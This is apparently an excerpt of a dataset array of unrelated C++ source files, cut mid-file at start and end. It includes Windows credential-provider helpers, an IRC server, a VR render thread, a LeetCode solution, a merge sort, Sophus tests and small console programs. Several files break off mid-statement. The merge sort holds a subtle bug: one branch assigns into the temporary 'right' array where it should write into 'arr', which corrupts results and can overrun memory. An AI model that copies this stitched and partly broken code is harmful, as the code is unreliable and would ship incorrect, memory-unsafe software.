S_OK;\n        }\n    }\n    else\n    {\n        hr = E_OUTOFMEMORY;\n    }\n\n    if (SUCCEEDED(hr))\n    {\n        *ppcpfd = pcpfd;\n    }\n    else\n    {\n        CoTaskMemFree(pcpfd);   \n    }\n\n    return hr;\n}\n\n//\n// Coppies rcpfd into the buffer pointed to by pcpfd. The caller is responsible for\n// allocating pcpfd. This function uses CoTaskMemAlloc to allocate memory for\n// pcpfd->pszLabel.\n//\nHRESULT FieldDescriptorCopy(\n    _In_ const CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR &rcpfd,\n    _Out_ CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR *pcpfd\n    )\n{\n    HRESULT hr;\n    CREDENTIAL_PROVIDER_FIELD_DESCRIPTOR cpfd;\n\n    cpfd.dwFieldID = rcpfd.dwFieldID;\n    cpfd.cpft = rcpfd.cpft;\n    cpfd.guidFieldType = rcpfd.guidFieldType;\n\n    if (rcpfd.pszLabel)\n    {\n        hr = SHStrDupW(rcpfd.pszLabel, &cpfd.pszLabel);\n    }\n    else\n    {\n        cpfd.pszLabel = nullptr;\n        hr = S_OK;\n    }\n\n    if (SUCCEEDED(hr))\n    {\n        *pcpfd = cpfd;\n    }\n\n    return hr;\n}\n\n//\n// This function copies the length of pwz and the pointer pwz into the UNICODE_STRING structure\n// This function is intended for serializing a credential in GetSerialization only.\n// Note that this function just makes a copy of the string pointer. It DOES NOT ALLOCATE storage!\n// Be very, very sure that this is what you want, because it probably isn't outside of the\n// exact GetSerialization call where the sample uses it.\n//\nHRESULT UnicodeStringInitWithString(\n    _In_ PWSTR pwz,\n    _Out_ UNICODE_STRING *pus\n    )\n{\n    HRESULT hr;\n    if (pwz)\n    {\n        size_t lenString = wcslen(pwz);\n        USHORT usCharCount;\n        hr = SizeTToUShort(lenString, &usCharCount);\n        if (SUCCEEDED(hr))\n        {\n            USHORT usSize;\n            hr = SizeTToUShort(sizeof(wchar_t), &usSize);\n            if (SUCCEEDED(hr))\n            {\n                hr = UShortMult(usCharCount, usSize, &(pus->Length)); // Explicitly NOT including NULL terminator\n                if (SUCCEEDED(hr))\n                {\n                    pus->MaximumLength = pus->Length;\n                    pus->Buffer = pwz;\n                    hr = S_OK;\n                }\n                else\n                {\n                    hr = HRESULT_FROM_WIN32(ERROR_ARITHMETIC_OVERFLOW);\n                }\n            }\n        }\n    }\n    else\n    {\n        hr = E_INVALIDARG;\n    }\n    return hr;\n}\n\n//\n// The following function is intended to be used ONLY with the Kerb*Pack functions.  It does\n// no bounds-checking because its callers have precise requirements and are written to respect\n// its limitations.\n// You can read more about the UNICODE_STRING type at:\n// http://msdn.microsoft.com/library/default.asp?url=/library/en-us/secauthn/security/unicode_string.asp\n//\nstatic void _UnicodeStringPackedUnicodeStringCopy(\n    __in const UNICODE_STRING& rus,\n    __in PWSTR pwzBuffer,\n    __out UNICODE_STRING *pus\n    )\n{\n    pus->Length = rus.Length;\n    pus->MaximumLength = rus.Length;\n    pus->Buffer = pwzBuffer;\n\n    CopyMemory(pus->Buffer, rus.Buffer, pus->Length);\n}\n\n//\n// Initialize the members of a KERB_INTERACTIVE_UNLOCK_LOGON with weak references to the\n// passed-in strings.  This is useful if you will later use KerbInteractiveUnlockLogonPack\n// to serialize the structure.\n//\n// The password is stored in encrypted form for CPUS_LOGON and CPUS_UNLOCK_WORKSTATION\n// because the system can accept encrypted credentials.  It is not encrypted in CPUS_CREDUI\n// because we cannot know whether our caller can accept encrypted credentials.\n//\nHRESULT KerbInteractiveUnlockLogonInit(\n    _In_ PWSTR pwzDomain,\n    _In_ PWSTR pwzUsername,\n    _In_ PWSTR pwzPassword,\n    _In_ CREDENTIAL_PROVIDER_USAGE_SCENARIO cpus,\n    _Out_ KERB_INTERACTIVE_UNL",
    "#include \"../../include/core/Server.hpp\"\n\n// #include <iostream>\n\n// \uc0dd\uc131\uc790\nServer::Server(char *port, char *password)\n\t: executor(password)\n{\n\t// \uc11c\ubc84 \uc18c\ucf13 \uc0dd\uc131\n\tSocket::makeServerSocket(port);\n}\n\n// \uc18c\uba78\uc790\nServer::~Server() {};\n\n// kqueue \uad00\ub9ac \uac1d\uccb4\nKqueue& Server::getKq()\n{\n\tstatic Kqueue kq;\n\n\treturn (kq);\n}\n\n// \ub2c9\ub124\uc784 \ubc30\uc5f4\nstd::vector<std::string>& Server::getNickList()\n{\n\tstatic std::vector<std::string> nickList;\n\n\treturn (nickList);\n}\n\n// \ud074\ub77c\uc774\uc5b8\ud2b8 \ubc30\uc5f4 \nstd::map<int, Client>& Server::getClientList()\n{\n\tstatic std::map<int, Client> clientList;\n\n\treturn (clientList);\n}\n\n// \ucc44\ub110 \ub9ac\uc2a4\ud2b8\nstd::map<std::string, Channel>& Server::getChannelList()\n{\n\tstatic std::map<std::string, Channel> channelList;\n\n\treturn (channelList);\n}\n\n// \uc11c\ubc84 IP\nstd::string Server::getIP()\n{\n\tstatic std::string IP;\n\tstatic bool first = true;\n\tif (first)\n\t{\n\t\t// hostname \uc800\uc7a5\n\t\tchar hostname[256];\n\t\tif (gethostname(hostname, sizeof(hostname)) == -1)\n\t\t\tthrow std::runtime_error(\"gethostname() error\");\n\t\t// hostentry \uc800\uc7a5\n\t\tstruct hostent* hostEntry = gethostbyname(hostname);\n\t\tif (hostEntry == NULL)\n\t\t\tthrow std::runtime_error(\"gethostbyname() error\");\n\t\t// \uc11c\ubc84 IP \uc800\uc7a5\n\t\tIP = inet_ntoa(*((struct in_addr*)hostEntry->h_addr_list[0]));\n\n\t\tfirst = false;\n\t}\n\treturn (IP);\n}\n\n// \ud074\ub77c\uc774\uc5b8\ud2b8 sendbuf\uc5d0 \uc788\ub294 \uba54\uc2dc\uc9c0 \uc804\uc1a1\ud558\ub294 \ud568\uc218\nvoid Server::sendMsgToClients(std::map<int, Client>& clientList)\n{\n\tstd::map<int, Client>::iterator iter;\n\tfor (iter = clientList.begin(); iter != clientList.end(); iter++)\n\t\titer->second.sendMsg();\n}\n\n// \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0\uac8c \uc628 \uba54\uc2dc\uc9c0\ub97c \ubc1b\ub294 \ud568\uc218\nvoid Server::receiveClientRequest(int fd)\n{\n\tstd::map<int, Client>& clientList = getClientList();\n\n\tif (fd == Socket::servSocket)\n\t{\n\t\t// \uc11c\ubc84\uc5d0 \ub4e4\uc5b4\uc628 \ud074\ub77c\uc774\uc5b8\ud2b8 \uc5f0\uacb0 \uc694\uccad\n\t\tint clientSocket = Socket::makeClientSocket(); // \uc5f0\uacb0 \uc18c\ucf13 \uc0dd\uc131\n\t\tclientList.insert(std::make_pair(clientSocket, Client(clientSocket))); // \ud074\ub77c\uc774\uc5b8\ud2b8 \ubc30\uc5f4\uc5d0 \ucd94\uac00\n\t\tclientList.find(clientSocket)->second.setOrigin(true);\n\t}\n\telse\n\t{\n\t\t// \uc11c\ubc84\uc5d0 \uc5f0\uacb0\ub418\uc5b4\uc788\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8\uc5d0\uac8c \uc628 \uba54\uc2dc\uc9c0 \ud655\uc778\n\t\tClient& client = clientList.find(fd)->second; // fd\uc5d0 \ub9de\ub294 \ud074\ub77c\uc774\uc5b8\ud2b8 \ucc3e\uae30\n\t\tclient.receiveMsg(); // \ud074\ub77c\uc774\uc5b8\ud2b8\uac00 \ubcf4\ub0b8 \uba54\uc2dc\uc9c0 \ubc1b\uae30\n\t\twhile (client.isCmdComplete()) // \uc644\uc131\ub41c \uba85\ub839\uc5b4\uac00 \uc788\uc73c\uba74 \uc2e4\ud589\n\t\t{\n\t\t\texecutor.execute(client, client.getCmd());\n\t\t\t// print_result();\n\t\t\tif (client.getQuitFlag())\n\t\t\t\tbreak;\n\t\t}\n\t\tsendMsgToClients(clientList);\n\t\tif (client.isDisconnected()) // eof\uac00 \ub4e4\uc5b4\uc628 \uacbd\uc6b0 \uc18c\ucf13 \uc5f0\uacb0 \uc885\ub8cc\n\t\t\tclientList.erase(fd); // \ud074\ub77c\uc774\uc5b8\ud2b8 \ubc30\uc5f4\uc5d0\uc11c \uc81c\uac70\n\t}\n}\n\n// \uc11c\ubc84 \uc2e4\ud589\nvoid Server::run()\n{\n\tKqueue& kq = getKq();\n\twhile (1)\n\t{\n\t\t// event \ubc1c\uc0dd \uac1c\uc218 \ud30c\uc545\n\t\tint eventCnt = kq.event();\n\n\t\t// event \ubc1c\uc0dd\ud55c \ub9cc\ud07c Loop\n\t\tfor (int idx = 0; idx < eventCnt; idx++)\n\t\t{\n\t\t\t// Event \ubc1c\uc0dd\uc5d0 \uc624\ub958 \ud655\uc778\n\t\t\tif (kq.isNotEventError(idx))\n\t\t\t\treceiveClientRequest(kq.getFd(idx)); // \ud074\ub77c\uc774\uc5b8\ud2b8 \uc694\uccad \ubc1b\uae30\n\t\t\telse\n\t\t\t\tthrow std::runtime_error(\"kevent() EV_ERROR flag\"); // \uc608\uc678 \ub358\uc9c0\uae30\n\t\t}\n\t}\n\n// void Server::print_result()\n// {\n// \tstd::map<int, Client>& clientList = getClientList();\n// \tstd::map<std::string, Channel>& channelList = getChannelList();\n// \tstd::vector<std::string>& nickList = getNickList();\n\n// \tstd::cout << \"\\n<Channel List> \\n\";\n// \tstd::map<std::string, Channel>::iterator channelIter = channelList.begin();\n// \tfor (; channelIter != channelList.end(); channelIter++)\n// \t{\n// \t\tstd::cout << \"channel name : \" << channelIter->second.getName() << \"\\n\";\n\t\t\n// \t\tstd::cout << \"<JOINList>\\n\";\n// \t\tstd::vector<Client*> joinList = channelIter->second.getJoinList();\n// \t\tstd::vector<Client*>::iterator joinIter = joinList.begin();\n// \t\tfor (; joinIter != joinList.end(); joinIter++)\n// \t\t\tstd::cout << (*joinIter)->getNick() << \"\\n\";\n\n// \t\tstd::cout << \"<OPList>\\n\";\n// \t\tstd::vector<Client*> opList = channelIter->second.getOpList();\n// \t\tstd::vector<Client*>::iterator opIter = opList.begin();\n// \t\tfor (; opIter != opList.end(); opIter++)\n// \t\t\tstd::cout << (*opIter)->getNick() << \"\\n\";\n\t\n// \t\tstd::cout << \"<InviteList>\\n\";\n// \t\tstd::vector<std::string> inviteList = channelIter->second.getInviteList();\n// \t\tstd::vector<std::string>::iterator inviteIter = inviteList.begin();\n// \t\tfor (; inviteIter != inviteList.end(); inviteIter++)\n// \t\t\tstd::cout << *inviteIter << \"\\n\";\n// \t}\n\n// \tstd::cout << \"\\n<clientList>\\n\";\n// \tstd::map<int, Client>::iterator clientIter = clientList.begin();\n// \tfor (; clientIter != clientList.end(); clientIter++)\n// \t{\n// \t\tstd::cout << \"Client nick : \" << clientIter->second.getNick() << \"\\n\";\n// \t\tstd::cout << \"Client socket : \" << clientIter->second.getFd() << \"\\n\";\n// \t\tstd::cout << \"<join channels>\\n\";\n// \t\tstd::vector<Channel*>& joinedChannels = clientIter->second.getJoinedChannels();\n// \t\tstd::vector<Channel*>::iterator joinchannelIter = joinedChannels.begin();\n// \t\tfor (; joinchannelIter != joinedChannels.end(); joinchannelIter++)\n// \t\t\tstd::cout << \"joined channel : \" << (*joinchannelIter)->getName() << \"\\n\";\n// \t}\n\n// \tstd::cout << \"\\n<nickList>\\n\";\n// \tstd::vector<std::string>::iterator nickIter = nickList.begin();\n// \tfor (; nickIter != nickList.end(); nickIter++)\n// \t{\n// \t\tstd::cout << \"NickList : \" << *nickIter << \"\\n\";\n// \t}\n// }\n}",
    "/**\t\t@file VRRenderThread.cpp\n  *\n  *\t\tEEEE2046 - Software Engineering & VR Project\n  *\n  *\t\tTemplate to add VR rendering to your application.\n  *\n  *\t\tP Evans 2022\n  */\n\n#include \"VRRenderThread.h\"\n\n/* Vtk headers */\n#include <vtkActor.h>\n#include <vtkOpenVRRenderWindow.h>\t\t\t\t\n#include <vtkOpenVRRenderWindowInteractor.h>\t\n#include <vtkOpenVRRenderer.h>\t\t\t\t\t\n#include <vtkOpenVRCamera.h>\t\n\n#include <vtkNew.h>\n#include <vtkSmartPointer.h>\n#include <vtkNamedColors.h>\n#include <vtkCylinderSource.h>\n#include <vtkPolyDataMapper.h>\n#include <vtkProperty.h>\n#include <vtkSTLReader.h>\n#include <vtkDataSetmapper.h>\n#include <vtkCallbackCommand.h>\n#include <vtkLight.h>\n\n\n/* The class constructor is called by MainWindow and runs in the primary program thread, this thread\n * will go on to handle the GUI (mouse clicks, etc). The OpenVRRenderWindowInteractor cannot be start()ed\n * in the constructor, as it will take control of the main thread to handle the VR interaction (headset \n * rotation etc. This means that a second thread is needed to handle the VR.\n */\nVRRenderThread::VRRenderThread( QObject* parent ) {\n\t/* Initialise actor list */\n\tactors = vtkActorCollection::New();\n\n\t/* Initialise command variables */\n\trotateX = 0.;\n\trotateY = 0.;\n\trotateZ = 0.;\n}\n\n\n/* Standard destructor - this is important here as the class will be destroyed when the user\n * stops the VR thread, and recreated when the user starts it again. If class variables are \n * not deallocated properly then there will be a memory leak, where the program's total memory\n * usage will increase for each start/stop thread cycle.\n */\nVRRenderThread::~VRRenderThread() {\n\n}\n\n\nvoid VRRenderThread::addActorOffline( vtkActor* actor ) {\n\n\t/* Check to see if render thread is running */\n\tif (!this->isRunning()) {\n\t\tdouble* ac = actor->GetOrigin();\n\t\n\t\t/* I have found that these initial transforms will position the FS\n\t\t * car model in a sensible position but you can experiment\n\t\t */\n\t\tactor->RotateX(-90);\n\t\tactor->AddPosition(-ac[0]+0, -ac[1]-100, -ac[2]-200);\n\n\t\tactors->AddItem(actor);\n\t}\n}\n\n\n\nvoid VRRenderThread::issueCommand( int cmd, double value ) {\n\n\t/* Update class variables according to command */\n\tswitch (cmd) {\n\t\t/* These are just a few basic examples */\n\t\tcase END_RENDER:\n\t\t\tthis->endRender = true;\n\t\t\tbreak;\n\n\t\tcase ROTATE_X:\n\t\t\tthis->rotateX = value;\n\t\t\tbreak;\n\n\t\tcase ROTATE_Y:\n\t\t\tthis->rotateY = value;\n\t\t\tbreak;\n\n\t\tcase ROTATE_Z:\n\t\t\tthis->rotateZ = value;\n\t\t\tbreak;\n\t}\n}\n\n/* This function runs in a separate thread. This means that the program \n * can fork into two separate execution paths. This thread is triggered by\n * calling VRRenderThread::start()\n */\nvoid VRRenderThread::run() {\n\t/* You might want to edit the 3D model once VR has started, however VTK is not \"thread safe\". \n\t * This means if you try to edit the VR model from the GUI thread while the VR thread is\n\t * running, the program could become corrupted and crash. The solution is to get the VR thread\n\t * to edit the model. Any decision to change the VR model will come fromthe user via the GUI thread, \n\t * so there needs to be a mechanism to pass data from the GUi thread to the VR thread.\n\t */\n\n\tvtkNew<vtkNamedColors> colors;\n\n\t// Set the background color.\n\tstd::array<unsigned char, 4> bkg{ {26, 51, 102, 255} };\n\tcolors->SetColor(\"BkgColor\", bkg.data());\n\t\n\t// The renderer generates the image\n\t// which is then displayed on the render window.\n\t// It can be thought of as a scene to which the actor is added\n\trenderer = vtkOpenVRRenderer::New();\t\n\t\n\trenderer->SetBackground(colors->GetColor3d(\"BkgColor\").GetData());\n\t\n\t/* Loop through list of actors provided and add to scene */\n\tvtkActor* a;\n\tactors->InitTraversal();\n\twhile( (a = (vtkActor*)actors->GetNextActor() ) ) {\n\t\trenderer->AddActor(a);\n\t}\n\n\t/* The render window is the actual GUI window\n\t * that appears on the computer screen\n\t */\n\twindow = vtkOpenVRRenderWindow::New();\n\n\twindow->Initialize();\n\twindow->AddRenderer(renderer);\n\t\n\t/* Create Open VR Camera */\n\tcamera = vtkOpenVRCamera::New();\t\t\t\t\n\trenderer->SetActiveCamera(camera);\t\t\t\n\n\t/* The render window interactor captures mouse events\n\t * and will perform appropriate camera or actor manipulation\n\t * depending on the nature of the events.\n\t */\n\tinteractor = vtkOpenVRRenderWindowInteractor::New();\t\t\t\t\t\t\t\t\t\n\tinteractor->SetRenderWindow(window);\t\t\t\t\t\t\t\t\t\t\t\t\t\n\tinteractor->Initialize();\n\twindow->Render();\n\t\n\n\t/* Now start the VR - we will implement the command loop manually\n\t * so it can be interrupted to make modifications to the actors\n\t * (i.e. to implement animation)\n\t */\n\tendRender = false;\n\tt_last = std::chrono::steady_clock::now();\n\n\twhile( !interactor->GetDone() && !this->endRender ) {\n\t\tinteractor->DoOneEvent( window, renderer );\n\n\t\t/* Check to see if enough time has elapsed since last update \n\t\t * This looks overcomplicated (and it is, C++ loves to make things unecessarily complicated!) but\n\t\t * is really just checking if more than 20ms have elaspsed since the last animation step. The \n\t\t * ",
    "/*Given an array of integers arr of even length n and an integer k.\n\nWe want to divide the array into exactly n / 2 pairs such that the sum of each pair is divisible by k.\n\nReturn true If you can find a way to do that or false otherwise.\n\n*/\n# include<iostream>\n# include<vector>\n# include<map>\nusing namespace std;\nclass Solution {\npublic:\n    bool canArrange(vector<int>& arr, int k) {\n        map<int,int>mp;\n        for(int i=0;i<arr.size();++i)\n        {   int r=((arr[i]%k)+k)%k;\n            mp[r]++;\n        }\n        for(auto it:mp){\n            if(it.first==0 )\n                  {  \n                    if( mp[it.first]%2==1)\n                    return false; \n                    }\n                    else{\n                 if(mp.find(k-it.first)==mp.end())\n                      return false;\n                      else if(mp[it.first]!=mp[k-it.first])\n                      return false; }    \n        }\n         return true;\n    }\n};\nint main(){\n    Solution obj;\n    vector<int>arr={1,2,3,4,5,10,6,7,8,9};\n    int k=5;\n    cout<<obj.canArrange(arr,k);\n    return 0;\n}\n// Time complexity: O(n)\n// Space complexity: O(n)\n// where n is the size of the array",
    "#include <iostream>\nusing namespace std;\nvoid merge(int arr[], int s, int e){\n  int mid =(s+e)/2;\n  // length of left array=mid-start+1\n  int LengthLeft=mid-s+1;\n  // legth of right array=end-mid \n  int LengthRight=e-mid;\n\n  // creating the dynamic array\n  int *left=new int[LengthLeft];\n  int *right =new int[LengthRight];\n   // copy karo value from original array to left array\n  int k=s;\n  for(int i=0;i<LengthLeft;i++){\n    left[i]=arr[k];\n    k++;\n  }\n  // right array copy karo\n\n  k=mid+1; \n  for(int i=0;i<LengthRight;i++){\n    right[i]=arr[k];\n    k++;\n  }\n  // for (int i = 0; i < LengthLeft; i++){\n  //   left[i] = arr[s + i];\n  // }\n\n  // // Copy values from the original array to the right array\n  // for (int i = 0; i < LengthRight; i++){\n  //   right[i] = arr[mid + 1 + i];\n  // }\n  // merge logic\n  // left array is already sorted\n  // right array is already sorted\n  int leftIndex=0;\n  int rightIndex=0;\n  int arrayindex=s;\n  while(leftIndex < LengthLeft && rightIndex < LengthRight){\n    \n    if(left[leftIndex]<right[rightIndex]){\n      arr[arrayindex]=left[leftIndex];\n      leftIndex++;\n      arrayindex++;\n    }\n    else{\n      right[arrayindex]=right[rightIndex];\n      rightIndex++;\n      arrayindex++;\n    }\n    \n  }\n  // 2 more cases.\n  // case 1 . if right array is exehusted\n  while(rightIndex<LengthRight){\n    arr[arrayindex]=right[rightIndex];\n    rightIndex++;\n    arrayindex++;\n    \n  }\n  // case 2 if left array is exehusted\n  while(leftIndex<LengthLeft){\n    arr[arrayindex]=left[leftIndex];\n    leftIndex++;\n    arrayindex++;\n    \n  } \n  // last  step ki heap memory ko free karo\n  delete []left;\n  delete []right;\n  \n  \n  \n}\nvoid mergeSort(int arr[], int s, int e){\n  // solving from recursion\n  // base case\n   if(s>=e){\n     return;\n   }\n  // break \n  int mid =s+(e-s)/2;\n  // recursion in left part\n  mergeSort(arr,s,mid);\n  // rightpart\n  mergeSort(arr,mid+1,e);\n  // merge two sorted array\n  merge(arr,s,e);\n\n  \n}\n\nint main() {\n  // Divide And conqure \n  // merge sort\n  int arr[] = {1,2,3,4,5,6};\n  int size = 6;\n  int s = 0;\n  int e = size - 1;\n\n  cout << \"Before merge sort: \" << endl;\n  for(int i=0; i<size; i++) {\n    cout << arr[i] << \" \";\n  }\n  cout << endl;\n\n  mergeSort(arr,s,e);\n\n  cout << \"After merge sort: \" << endl;\n  for(int i=0; i<size; i++) {\n    cout << arr[i] << \" \";\n  }\n  cout << endl;\n //  int arr[]={6,5,4,3,2,1};\n //  int size=6;\n //  for(int i=0;i<size;i++){\n //    cout<<arr[i]<<\" \";\n //  }\n //  cout<<endl;\n //  mergeSort(arr,0,size-1);\n // // after merge sort \n //  // printing the array \n //  for(int i=0;i<size;i++){\n //    cout<<arr[i]<<\" \";\n //  }\n\n\n  // merge two sorted array\n  // int arr[]={1,2,3};\n  // int size=3;\n  // int arr1[]={1,3,5};\n  // int size1=3;\n  \n  \n}\n",
    "#include <iostream>\n\n#include <unsupported/Eigen/MatrixFunctions>\n\n#include <sophus/sim3.hpp>\n#include \"tests.hpp\"\n\n// Explicit instantiate all class templates so that all member methods\n// get compiled and for code coverage analysis.\nnamespace Eigen {\ntemplate class Map<Sophus::Sim3<double>>;\ntemplate class Map<Sophus::Sim3<double> const>;\n}  // namespace Eigen\n\nnamespace Sophus {\n\ntemplate class Sim3<double, Eigen::AutoAlign>;\ntemplate class Sim3<float, Eigen::DontAlign>;\n#if SOPHUS_CERES\ntemplate class Sim3<ceres::Jet<double, 3>>;\n#endif\n\ntemplate <class Scalar>\nclass Tests {\n public:\n  using Sim3Type = Sim3<Scalar>;\n  using RxSO3Type = RxSO3<Scalar>;\n  using Point = typename Sim3<Scalar>::Point;\n  using Vector4Type = Vector4<Scalar>;\n  using Tangent = typename Sim3<Scalar>::Tangent;\n  Scalar const kPi = Constants<Scalar>::pi();\n\n  Tests() {\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.2), Scalar(0.5),\n                                            Scalar(0.0), Scalar(1.))),\n                 Point(Scalar(0), Scalar(0), Scalar(0))));\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.2), Scalar(0.5),\n                                            Scalar(-1.0), Scalar(1.1))),\n                 Point(Scalar(10), Scalar(0), Scalar(0))));\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.), Scalar(0.), Scalar(0.),\n                                            Scalar(0.))),\n                 Point(Scalar(0), Scalar(10), Scalar(5))));\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.), Scalar(0.), Scalar(0.),\n                                            Scalar(1.1))),\n                 Point(Scalar(0), Scalar(10), Scalar(5))));\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.), Scalar(0.),\n                                            Scalar(0.00001), Scalar(0.))),\n                 Point(Scalar(0), Scalar(0), Scalar(0))));\n    sim3_vec_.push_back(Sim3Type(\n        RxSO3Type::exp(Vector4Type(Scalar(0.), Scalar(0.), Scalar(0.00001),\n                                   Scalar(0.0000001))),\n        Point(Scalar(1), Scalar(-1.00000001), Scalar(2.0000000001))));\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.), Scalar(0.),\n                                            Scalar(0.00001), Scalar(0))),\n                 Point(Scalar(0.01), Scalar(0), Scalar(0))));\n    sim3_vec_.push_back(Sim3Type(\n        RxSO3Type::exp(Vector4Type(kPi, Scalar(0), Scalar(0), Scalar(0.9))),\n        Point(Scalar(4), Scalar(-5), Scalar(0))));\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.2), Scalar(0.5),\n                                            Scalar(0.0), Scalar(0))),\n                 Point(Scalar(0), Scalar(0), Scalar(0))) *\n        Sim3Type(\n            RxSO3Type::exp(Vector4Type(kPi, Scalar(0), Scalar(0), Scalar(0))),\n            Point(Scalar(0), Scalar(0), Scalar(0))) *\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(-0.2), Scalar(-0.5),\n                                            Scalar(-0.0), Scalar(0))),\n                 Point(Scalar(0), Scalar(0), Scalar(0))));\n    sim3_vec_.push_back(\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(0.3), Scalar(0.5),\n                                            Scalar(0.1), Scalar(0))),\n                 Point(Scalar(2), Scalar(0), Scalar(-7))) *\n        Sim3Type(\n            RxSO3Type::exp(Vector4Type(kPi, Scalar(0), Scalar(0), Scalar(0))),\n            Point(Scalar(0), Scalar(0), Scalar(0))) *\n        Sim3Type(RxSO3Type::exp(Vector4Type(Scalar(-0.3), Scalar(-0.5),\n                                            Scalar(-0.1), Scalar(0))),\n                 Point(Scalar(0), Scalar(6), Scalar(0))));\n    Tangent tmp;\n    tmp << Scalar(0), Scalar(0), Scalar(0), Scalar(0), Scalar(0), Scalar(0),\n        Scalar(0);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(1), Scalar(0), Scalar(0), Scalar(0), Scalar(0), Scalar(0),\n        Scalar(0);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(0), Scalar(1), Scalar(0), Scalar(1), Scalar(0), Scalar(0),\n        Scalar(0.1);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(0), Scalar(0), Scalar(1), Scalar(0), Scalar(1), Scalar(0),\n        Scalar(0.1);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(-1), Scalar(1), Scalar(0), Scalar(0), Scalar(0), Scalar(1),\n        Scalar(-0.1);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(20), Scalar(-1), Scalar(0), Scalar(-1), Scalar(1), Scalar(0),\n        Scalar(-0.1);\n    tangent_vec_.push_back(tmp);\n    tmp << Scalar(30), Scalar(5), Scalar(-1), Scalar(20), Scalar(-1), Scalar(0),\n        Scalar(1.5);\n    tangent_vec_.push_back(tmp);\n\n    point_vec_.push_back(Point(Scalar(1), Scalar(2), Scalar(4)));\n    point_vec_.push_back(Point(Scalar(1), Scalar(-3), Scalar(0.5)));\n  }\n\n  void runAll() {\n    bool passed = testLieProperties();\n    passed &= testRawDataAcces();\n    passed &= testConstructors();\n    processTestResult(passe",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <iomanip>\r\n\r\nstruct Student {\r\n    std::string name;\r\n    std::vector<double> grades;\r\n};\r\n\r\nint main() {\r\n    std::vector<Student> students;\r\n    char choice;\r\n\r\n    do {\r\n        std::cout << \"1. Add Student\\n\";\r\n        std::cout << \"2. Add Grade for Student\\n\";\r\n        std::cout << \"3. Calculate Average Grade\\n\";\r\n        std::cout << \"4. View Students and Grades\\n\";\r\n        std::cout << \"5. Quit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch(choice) {\r\n            case '1':\r\n                {\r\n                    Student newStudent;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> newStudent.name;\r\n                    students.push_back(newStudent);\r\n                }\r\n                break;\r\n            case '2':\r\n                {\r\n                    std::string studentName;\r\n                    double grade;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> studentName;\r\n                    bool found = false;\r\n                    for (auto& student : students) {\r\n                        if (student.name == studentName) {\r\n                            std::cout << \"Enter grade for \" << studentName << \": \";\r\n                            std::cin >> grade;\r\n                            student.grades.push_back(grade);\r\n                            found = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!found) {\r\n                        std::cout << \"Student not found!\\n\";\r\n                    }\r\n                }\r\n                break;\r\n            case '3':\r\n                {\r\n                    std::string studentName;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> studentName;\r\n                    bool found = false;\r\n                    for (const auto& student : students) {\r\n                        if (student.name == studentName) {\r\n                            double total = 0;\r\n                            for (const auto& grade : student.grades) {\r\n                                total += grade;\r\n                            }\r\n                            double average = total / student.grades.size();\r\n                            std::cout << \"Average grade for \" << studentName << \": \" << std::fixed << std::setprecision(2) << average << std::endl;\r\n                            found = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!found) {\r\n                        std::cout << \"Student not found!\\n\";\r\n                    }\r\n                }\r\n                break;\r\n            case '4':\r\n                {\r\n                    std::cout << \"Students and Grades:\\n\";\r\n                    for (const auto& student : students) {\r\n                        std::cout << \"Student: \" << student.name << \", Grades: \";\r\n                        for (const auto& grade : student.grades) {\r\n                            std::cout << grade << \" \";\r\n                        }\r\n                        std::cout << std::endl;\r\n                    }\r\n                }\r\n                break;\r\n            case '5':\r\n                std::cout << \"Exiting program...\";\r\n                break;\r\n            default:\r\n                std::cout << \"Invalid choice!\\n\";\r\n                break;\r\n        }\r\n    } while (choice != '5');\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "\ufeff#include <iostream>\n#include <math.h>\n#include <string>\n#include <fstream>\n#include <random>\n#include <cstring>\n#include <cstdlib>\n#include <conio.h>\n#include <Windows.h>\n#include <locale>\n#include <codecvt>\n#include <chrono>\n#include <iomanip>\n#include <sstream>\n#include <ctime>\nusing namespace std;\nclass DBAds {\npublic:\n    string DB = \"./DB/ads.txt\";\n    vector<vector<string>> getAllAds() {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 